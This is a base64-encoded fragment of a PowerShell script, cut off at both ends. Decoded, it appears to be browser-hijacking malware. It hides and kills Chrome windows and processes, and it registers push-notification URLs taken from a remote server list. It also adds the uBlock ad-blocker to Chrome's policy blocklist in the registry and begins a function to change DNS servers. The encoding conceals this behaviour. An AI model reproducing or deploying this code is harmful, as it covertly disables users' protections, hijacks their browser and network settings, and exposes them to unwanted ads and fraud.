luZG93IHsNCiAgICBwYXJhbSAoJHdpbmRvdykNCiAgICBbVXNlcjMyWF06OkNsb3NlV2luZG93KCR3aW5kb3cpIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDI1DQp9DQoNCmZ1bmN0aW9uIENsb3NlLUNocm9tZSB7DQogICAgcGFyYW0gKCRwcm9jZXNzKQ0KICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUNCiAgICB0cnkgew0KICAgICAgICAkcHJvY2Vzcy5DbG9zZSgpDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIENsb3NlLUFsbENocm9tZXMgew0KICAgICR3aW5kb3dzID0gW1VzZXIzMlhdOjpFbnVtZXJhdGVBbGxXaW5kb3dzKCkNCiAgICBmb3JlYWNoICgkd2luZG93IGluICR3aW5kb3dzKSANCiAgICB7DQogICAgICAgICR0aXRsZSA9IFtVc2VyMzJYXTo6R2V0V2luZG93VGV4dCgkd2luZG93KQ0KICAgICAgICBpZiAoJHRpdGxlLkNvbnRhaW5zKCJHb29nbGUgQ2hyb21lIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkd2luZG93LCBbVXNlcjMyWF06OlNXX0hJREUpIHwgT3V0LU51bGwNCiAgICAgICAgICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICR3aW5kb3cNCiAgICAgICAgfQ0KICAgIH0NCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnY2hyb21lLmV4ZScpKQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVDaHJvbWVQdXNoZXMgew0KICAgIEFkZC1UeXBlIEAiDQogICAgdXNpbmcgU3lzdGVtOw0KICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KICAgIHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCiAgICB1c2luZyBTeXN0ZW0uVGV4dDsNCg0KICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgVXNlcjMyWCB7DQogICAgICAgIHB1YmxpYyBkZWxlZ2F0ZSBib29sIEVudW1XaW5kb3dzUHJvYyhJbnRQdHIgaFduZCwgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBFbnVtV2luZG93cyhFbnVtV2luZG93c1Byb2MgbHBFbnVtRnVuYywgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQsIFN0cmluZ0J1aWxkZXIgbHBTdHJpbmcsIGludCBuTWF4Q291bnQpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0TGVuZ3RoKEludFB0ciBoV25kKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIElzV2luZG93VmlzaWJsZShJbnRQdHIgaFduZCk7DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgaW50IGxlbmd0aCA9IEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCk7DQogICAgICAgICAgICBpZiAobGVuZ3RoID09IDApIHJldHVybiBTdHJpbmcuRW1wdHk7DQoNCiAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcihsZW5ndGggKyAxKTsNCiAgICAgICAgICAgIEdldFdpbmRvd1RleHQoaFduZCwgc2IsIHNiLkNhcGFjaXR5KTsNCiAgICAgICAgICAgIHJldHVybiBzYi5Ub1N0cmluZygpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIElzV2luZG93VmlzaWJsZUV4KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICByZXR1cm4gSXNXaW5kb3dWaXNpYmxlKGhXbmQpICYmIEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCkgPiAwOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBJbnRQdHJbXSBFbnVtZXJhdGVBbGxXaW5kb3dzKCkgew0KICAgICAgICAgICAgdmFyIHdpbmRvd0hhbmRsZXMgPSBuZXcgTGlzdDxJbnRQdHI+KCk7DQogICAgICAgICAgICBFbnVtV2luZG93cygoaFduZCwgbFBhcmFtKSA9PiB7DQogICAgICAgICAgICAgICAgaWYgKElzV2luZG93VmlzaWJsZUV4KGhXbmQpKSB7DQogICAgICAgICAgICAgICAgICAgIHdpbmRvd0hhbmRsZXMuQWRkKGhXbmQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgIHJldHVybiB3aW5kb3dIYW5kbGVzLlRvQXJyYXkoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KDQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfSElERSA9IDA7DQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUlOSU1JWkUgPSA2Ow0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX1NIT1cgPSA1Ow0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBQb3N0TWVzc2FnZShJbnRQdHIgaFduZCwgdWludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBDbG9zZVdpbmRvdyhJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgY29uc3QgdWludCBXTV9DTE9TRSA9IDB4MDAxMDsNCiAgICAgICAgICAgIFBvc3RNZXNzYWdlKGhXbmQsIFdNX0NMT1NFLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAgICAgICB9DQogICAgfQ0KIkANCg0KICAgIENsb3NlLUFsbENocm9tZXM7DQogICAgUmVtb3ZlLVB1c2hlczsNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgew0KICAgICAgICBBZGQtUHVzaCAtcHVzaFVybCAkcHVzaA0KICAgIH0NCn0NCg0KDQoNCmZ1bmN0aW9uIE9wZW4tQ2hyb21lV2l0aFVybCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsICRpc0RlYnVnDQogICAgKQ0KICAgICRqb2IgPSBTdGFydC1Kb2IgLVNjcmlwdEJsb2NrIHsNCiAgICAgICAgICAgIHBhcmFtICgkdXJsLCAkaXNEZWJ1ZykNCg0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICANCiANCiAgICAgICAgICAgIEFkZC1UeXBlIEAiDQogICAgICAgICAgICB1c2luZyBTeXN0ZW07DQogICAgICAgICAgICB1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5UZXh0Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGNsYXNzIFVzZXIzMlggew0KICAgICAgICAgICAgICAgIHB1YmxpYyBkZWxlZ2F0ZSBib29sIEVudW1XaW5kb3dzUHJvYyhJbnRQdHIgaFduZCwgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bVdpbmRvd3MoRW51bVdpbmRvd3NQcm9jIGxwRW51bUZ1bmMsIEludFB0ciBsUGFyYW0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCwgU3RyaW5nQnVpbGRlciBscFN0cmluZywgaW50IG5NYXhDb3VudCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0TGVuZ3RoKEludFB0ciBoV25kKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJc1dpbmRvd1Zpc2libGUoSW50UHRyIGhXbmQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgICAgICAgICBpbnQgbGVuZ3RoID0gR2V0V2luZG93VGV4dExlbmd0aChoV25kKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGxlbmd0aCA9PSAwKSByZXR1cm4gU3RyaW5nLkVtcHR5Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcihsZW5ndGggKyAxKTsNCiAgICAgICAgICAgICAgICAgICAgR2V0V2luZG93VGV4dChoV25kLCBzYiwgc2IuQ2FwYWNpdHkpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gc2IuVG9TdHJpbmcoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNXaW5kb3dWaXNpYmxlRXgoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIElzV2luZG93VmlzaWJsZShoV25kKSAmJiBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpID4gMDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIEludFB0cltdIEVudW1lcmF0ZUFsbFdpbmRvd3MoKSB7DQogICAgICAgICAgICAgICAgICAgIHZhciB3aW5kb3dIYW5kbGVzID0gbmV3IExpc3Q8SW50UHRyPigpOw0KICAgICAgICAgICAgICAgICAgICBFbnVtV2luZG93cygoaFduZCwgbFBhcmFtKSA9PiB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXNXaW5kb3dWaXNpYmxlRXgoaFduZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3dIYW5kbGVzLkFkZChoV25kKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9LCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB3aW5kb3dIYW5kbGVzLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19ISURFID0gMDsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX01JTklNSVpFID0gNjsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX1NIT1cgPSA1Ow0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUFYSU1JWkUgPSAzOyAvLyBBZGRlZCBjb25zdGFudCBmb3IgbWF4aW1pemluZyB3aW5kb3cNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFBvc3RNZXNzYWdlKEludFB0ciBoV25kLCB1aW50IE1zZywgSW50UHRyIHdQYXJhbSwgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgQ2xvc2VXaW5kb3coSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgdWludCBXTV9DTE9TRSA9IDB4MDAxMDsNCiAgICAgICAgICAgICAgICAgICAgUG9zdE1lc3NhZ2UoaFduZCwgV01fQ0xPU0UsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KIkANCn0NCmNhdGNoIHsNCn0NCiAgICAgICAgDQogICAgICAgIGZ1bmN0aW9uIENsb3NlLUNocm9tZVdpbmRvdyB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIHBhcmFtICgkd2luZG93KQ0KICAgICAgICAgICAgICAgIFtVc2VyMzJYXTo6Q2xvc2VXaW5kb3coJHdpbmRvdykgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCB7fQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiBDbG9zZS1DaHJvbWUgew0KICAgICAgICAgICAgcGFyYW0gKCRwcm9jZXNzKQ0KICAgICAgICAgICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZQ0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkcHJvY2VzcyB8IFN0b3AtUHJvY2VzcyAtRm9yY2UNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgICRjaHJvbWVQYXRocyA9IEAoDQogICAgICAgICAgICAiQzpcUHJvZ3JhbSBGaWxlc1xHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIiRlbnY6UHJvZ3JhbUZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiJGVudjpQcm9ncmFtRmlsZXMoeDg2KVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiDQogICAgICAgICkNCiAgICAgICAgJHJlc29sdmVkUGF0aHMgPSBAKCkNCiAgICAgICAgZm9yZWFjaCAoJHBhdGggaW4gJGNocm9tZVBhdGhzKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRyZXNvbHZlZFBhdGggPSBSZXNvbHZlLVBhdGggLVBhdGggJHBhdGggLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgICAgICAgICBpZiAoJHJlc29sdmVkUGF0aCAtbm90aW4gJHJlc29sdmVkUGF0aHMpIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc29sdmVkUGF0aHMgKz0gJHJlc29sdmVkUGF0aC5QYXRoDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJFcnJvciByZXNvbHZpbmcgcGF0aDogJF8iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHJlc29sdmVkUGF0aHMgPSAkcmVzb2x2ZWRQYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZQ0KICAgICAgICBmb3JlYWNoICgkcGF0aCBpbiAkcmVzb2x2ZWRQYXRocykgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCkgew0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiRm91bmQgQ2hyb21lIGF0OiAkcGF0aCINCiAgICANCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5GaWxlTmFtZSA9ICRwYXRoDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uQXJndW1lbnRzID0gIi0taGVhZGxlc3MgLS1kaXNhYmxlLWdwdSAtLWR1bXAtZG9tICR1cmwiDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAkcHJvY2VzcyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MNCiAgICAgICAgICAgICAgICAkcHJvY2Vzcy5TdGFydEluZm8gPSAkcHJvY2Vzc1N0YXJ0SW5mbw0KICAgICAgICAgICAgICAgICRwcm9jZXNzLlN0YXJ0KCkgfCBPdXQtTnVsbCAgICAgICAgIA0KICAgICAgICAgICAgICAgICRlbmRUaW1lID0gKEdldC1EYXRlKS5BZGRTZWNvbmRzKDgpDQogICAgICAgICAgICAgICAgd2hpbGUgKChHZXQtRGF0ZSkgLWx0ICRlbmRUaW1lKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkaXNEZWJ1ZyAtZXEgJGZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAjIHRyeQ0KICAgICAgICAgICAgICAgICAgICAgICAgIyB7DQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICBbVXNlcjMyWF06OlNob3dXaW5kb3coJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZSwgW1VzZXIzMlhdOjpTV19ISURFKSB8IE91dC1OdWxsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICMgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgIyBjYXRjaA0KICAgICAgICAgICAgICAgICAgICAgICAgIyB7DQogICAgICAgICAgICAgICAgICAgICAgICAjIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwMA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAjIHRyeQ0KICAgICAgICAgICAgICAgICMgew0KICAgICAgICAgICAgICAgICMgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkcHJvY2Vzcy5NYWluV2luZG93SGFuZGxlLCBbVXNlcjMyWF06OlNXX1NIT1cpIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICAjIH0NCiAgICAgICAgICAgICAgICAjIGNhdGNoDQogICAgICAgICAgICAgICAgIyB7DQogICAgICAgICAgICAgICAgIyB9DQogICAgICAgICAgICAgICAgQ2xvc2UtQ2hyb21lIC1wcm9jZXNzICRwcm9jZXNzDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJDaHJvbWUgbm90IGZvdW5kIGF0OiAkcGF0aCINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgfSAtQXJndW1lbnRMaXN0ICR1cmwsICRpc0RlYnVnDQoNCiAgICByZXR1cm4gJGpvYg0KfQ0KDQpmdW5jdGlvbiBMYXVuY2hDaHJvbWVQdXNoZXMgew0KICAgICRpc0RlYnVnID0gSXNEZWJ1Zw0KICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSB7DQogICAgICAgIE9wZW4tQ2hyb21lV2l0aFVybCAtdXJsICRwdXNoIC1pc0RlYnVnICRpc0RlYnVnDQogICAgICAgIGJyZWFrDQogICAgfQ0KfQ0KCgoNCg0KZnVuY3Rpb24gQ29uZmlndXJlQ2hyb21lVWJsb2NrIHsNCiAgICAka2V5d29yZHMgPSBAKCJ1QmxvY2siKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJGNocm9tZURpciA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggIkdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcRXh0ZW5zaW9ucyINCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRjaHJvbWVEaXIgLVBhdGhUeXBlIENvbnRhaW5lcikgew0KICAgICAgICAgICAgICAgICRleHRlbnNpb25zID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkY2hyb21lRGlyIC1EaXJlY3RvcnkNCg0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRleHRlbnNpb24gaW4gJGV4dGVuc2lvbnMpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1hbkZpbGUgPSBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSAtZm9sZGVyICRleHRlbnNpb24uRnVsbE5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRtYW5GaWxlIC1uZSAiIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kS2V5d29yZCA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkbWFuaWZlc3RWYWx1ZSBpbiAka2V5d29yZHMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRtYW5GaWxlIC1SYXcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGNvbnRlbnQgLW1hdGNoIFtyZWdleF06OkVzY2FwZSgkbWFuaWZlc3RWYWx1ZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kS2V5d29yZCA9ICR0cnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGZvdW5kS2V5d29yZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleHRGb2xkZXJOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJGV4dGVuc2lvbi5GdWxsTmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0QWxsIC1leHROYW1lICRleHRGb2xkZXJOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgIFdyaXRlLUVycm9yICJFcnJvciBvY2N1cnJlZDogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZm9sZGVyDQogICAgKQ0KDQogICAgJHJlc3VsdCA9ICIiDQoNCiAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRmb2xkZXIgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgIGlmICgtbm90ICgkXy5QU0lzQ29udGFpbmVyKSkgew0KICAgICAgICAgICAgaWYgKCRfLk5hbWUgLWVxICJtYW5pZmVzdC5qc29uIikgew0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2VpZiAoJF8uTmFtZSAtbm90aW4gQCgnLicsICcuLicpKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgLWZvbGRlciAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgaWYgKCRyZXN1bHQgLW5lICIiKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KDQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3RBbGwgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZXh0TmFtZQ0KICAgICkNCg0KICAgIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3QgLWV4dE5hbWUgJGV4dE5hbWUgLWJyb3dzZXIgIkdvb2dsZVxDaHJvbWUiDQp9DQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3Qgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZXh0TmFtZSwNCiAgICAgICAgW3N0cmluZ10kYnJvd3Nlcg0KICAgICkNCg0KICAgICRyZWdQYXRoID0gIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXCRicm93c2VyXEV4dGVuc2lvbkluc3RhbGxCbG9ja2xpc3QiDQogICAgDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcmVnUGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ1BhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQogICAgDQogICAgJHJlZ0tleUluZGV4ID0gMQ0KICAgIGRvIHsNCiAgICAgICAgJGtleU5hbWUgPSAiJHJlZ0tleUluZGV4Ig0KICAgICAgICAkdmFsID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCAtTmFtZSAka2V5TmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBpZiAoJHZhbCAtZXEgJGV4dE5hbWUpIHsNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQogICAgICAgICRyZWdLZXlJbmRleCsrDQogICAgfSB1bnRpbCAoLW5vdCAoVGVzdC1QYXRoICIkcmVnUGF0aFwka2V5TmFtZSIpKQ0KDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCAtTmFtZSAka2V5TmFtZSAtVmFsdWUgJGV4dE5hbWUNCn0NCgoKDQoNCmZ1bmN0aW9uIFNldC1EbnNTZXJ2ZXJzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHByaW1hcnlEbnNTZXJ2ZXIsDQogICAgICAgIFtzdHJpbmd